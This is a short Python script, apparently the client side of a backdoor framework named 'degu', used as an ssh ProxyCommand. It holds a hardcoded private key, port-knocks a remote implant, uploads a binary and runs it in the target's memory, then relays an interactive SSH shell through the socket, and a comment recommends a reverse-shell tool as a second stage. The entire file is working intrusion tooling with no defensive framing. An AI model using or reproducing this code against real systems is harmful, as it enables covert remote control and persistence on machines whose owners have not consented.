#!/usr/bin/env python
# Usage
# ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oProxyCommand="./degussh.py" foobar
# https://github.com/NHAS/reverse_ssh works well for stage2 bin 

import time
import select
import sys
sys.path.append("../../")
import degu

PRIV="f82876e92eaadc0702c16e7deca02ffe25116e84c8ba1e9ebb7423446dbae0534700b14ed3e531a3bc90f852b812df7d79e55190f60c9f2dc6fc0dc67aed0e92"
LIB="../../../degu.so"


class proxy(object):
    def __init__(self,fd):
        self.fd = fd

    def loop(self):
        self.fd.send( b"\n" )
        while True:
            rs, ws, es = select.select([ sys.stdin, self.fd ], [], [])    
            for r in rs:
                if r is sys.stdin:
                    data =  r.buffer.raw.read(1024)
                    self.fd.send( data )
                elif r is self.fd:
                    data = r.recv(1024)
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()

# make new degu client object
client = degu.degu("1.2.3.4",priv=PRIV,lib=LIB)
# knock it 
client.knock(b":31337")
# wait for knock to process, max 3 seconds
time.sleep(3) 
# send and exec our pty in memory and retrieve socket object, 
# tune the memfd flag True/False for go static bins on some systems it will fail on auxv stack setup because go calculate allocation size
sock = client.helper(b"./degussh",b"SSH",memfd=False)
# wait for exe execution
time.sleep(1) 
# make new proxycommand object
p = proxy(sock)
# interact
p.loop()

